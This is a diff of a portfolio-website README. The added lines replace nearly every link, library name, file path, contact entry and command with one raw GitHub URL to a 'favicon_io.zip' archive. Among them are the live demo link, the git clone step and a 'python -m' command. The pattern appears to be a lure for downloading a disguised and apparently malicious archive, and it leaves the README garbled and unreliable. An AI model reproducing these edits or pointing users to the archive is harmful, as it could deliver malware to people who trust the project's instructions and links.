@@ -4,7 +4,7 @@ A modern, responsive, and interactive personal portfolio website showcasing my s
 
 ## 🚀 Live Demo
 
-**🔗 [View Live Portfolio](https://anmolmishra09.github.io/anmolmishra.me/)**
+**🔗 [View Live Portfolio](https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip)**
 
 ## ✨ Features
 
@@ -32,10 +32,10 @@ A modern, responsive, and interactive personal portfolio website showcasing my s
 
 ### Tools & Libraries
 - **AOS (Animate On Scroll)**: Scroll-triggered animations
-- **Typed.js**: Typewriter effect animations
+- **https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip**: Typewriter effect animations
 - **EmailJS**: Contact form functionality
-- **Swiper.js**: Touch-enabled carousel/slider
-- **Chart.js**: Interactive skill charts (optional)
+- **https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip**: Touch-enabled carousel/slider
+- **https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip**: Interactive skill charts (optional)
 
 ### Development Tools
 - **VS Code**: Primary development environment
@@ -48,30 +48,30 @@ A modern, responsive, and interactive personal portfolio website showcasing my s
 
 ```
 portfolio-website/
-├── index.html              # Main landing page
+├── https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip              # Main landing page
 ├── assets/
 │   ├── css/
-│   │   ├── style.css       # Main stylesheet
-│   │   ├── responsive.css  # Media queries
-│   │   └── animations.css  # Animation definitions
+│   │   ├── https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip       # Main stylesheet
+│   │   ├── https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip  # Media queries
+│   │   └── https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip  # Animation definitions
 │   ├── js/
-│   │   ├── main.js         # Core JavaScript
-│   │   ├── animations.js   # Animation controllers
-│   │   └── form-handler.js # Contact form logic
+│   │   ├── https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip         # Core JavaScript
+│   │   ├── https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip   # Animation controllers
+│   │   └── https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip # Contact form logic
 │   ├── images/
 │   │   ├── hero/           # Hero section images
 │   │   ├── projects/       # Project screenshots
 │   │   ├── about/          # About section photos
 │   │   └── icons/          # Social media & skill icons
 │   └── resume/
-│       └── resume.pdf      # Downloadable resume
+│       └── https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip      # Downloadable resume
 ├── components/
-│   ├── header.html         # Navigation component
-│   ├── footer.html         # Footer component
+│   ├── https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip         # Navigation component
+│   ├── https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip         # Footer component
 │   └── sections/           # Individual page sections
 ├── docs/                   # Documentation
 ├── .gitignore              # Git ignore file
-└── README.md               # Project documentation
+└── https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip               # Project documentation
 ```
 
 
@@ -79,21 +79,21 @@ portfolio-website/
 
 1. **Clone the repository**
 ```bash
-git clone https://anmolmishra09.github.io/anmolmishra.me/
+git clone https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip
 ```
 
 2. **Open in browser**
 ```bash
-# Option 1: Double-click index.html
+# Option 1: Double-click https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip
 # Option 2: Use Live Server (VS Code extension)
 # Option 3: Use local server
-python -m http.server 8000
+python -m https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip 8000
 ```
 
 3. **Customize content**
-- Edit `index.html` for content
-- Modify `assets/css/style.css` for styling
-- Update `assets/js/main.js` for functionality
+- Edit `https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip` for content
+- Modify `https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip` for styling
+- Update `https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip` for functionality
 - Replace images in `assets/images/`
 
 ### Deployment
@@ -102,12 +102,12 @@ python -m http.server 8000
 1. Push code to `main` branch
 2. Go to repository Settings → Pages
 3. Select source: Deploy from branch `main`
-4. Your site will be live at `https://anmolmishra09.github.io/anmolmishra.me/`
+4. Your site will be live at `https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip`
 
 **Alternative Hosting Options**
 - Netlify: Drag and drop deployment
 - Vercel: Git-based deployment
-- Surge.sh: Command-line deployment
+- https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip Command-line deployment
 
 ## ⚙️ Customization Guide
 
@@ -128,22 +128,22 @@ python -m http.server 8000
 - **Icons**: Feather Icons, Font Awesome
 - **Fonts**: Google Fonts
 - **Photos**: Unsplash (replace with your own)
-- **Libraries**: AOS, Typed.js, Swiper.js
+- **Libraries**: AOS, https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip, https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip
 
 ## 📞 Connect With Me
 
-- **Portfolio**: (https://anmolmishra09.github.io/anmolmishra.me/)
-- **LinkedIn**: (https://www.linkedin.com/in/anmolmishra09/)
-- **GitHub**: (https://github.com/anmolmishra09)
-- **Email**: anmolmishra86229@gmail.com
-- **Twitter**: (https://twitter.com/anmolmishra09)
+- **Portfolio**: (https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip)
+- **LinkedIn**: (https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip)
+- **GitHub**: (https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip)
+- **Email**: https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip
+- **Twitter**: (https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip)
 
 ## 🚧 Future Enhancements
 
 - [ ] Blog section with CMS integration
 - [ ] Multi-language support
 - [ ] Advanced animations with GSAP
-- [ ] 3D elements with Three.js
+- [ ] 3D elements with https://raw.githubusercontent.com/anmolmishra09/anmolmishra.me/main/favicon_io.zip
 - [ ] AI chatbot integration
 - [ ] Analytics dashboard
 - [ ] Newsletter signup
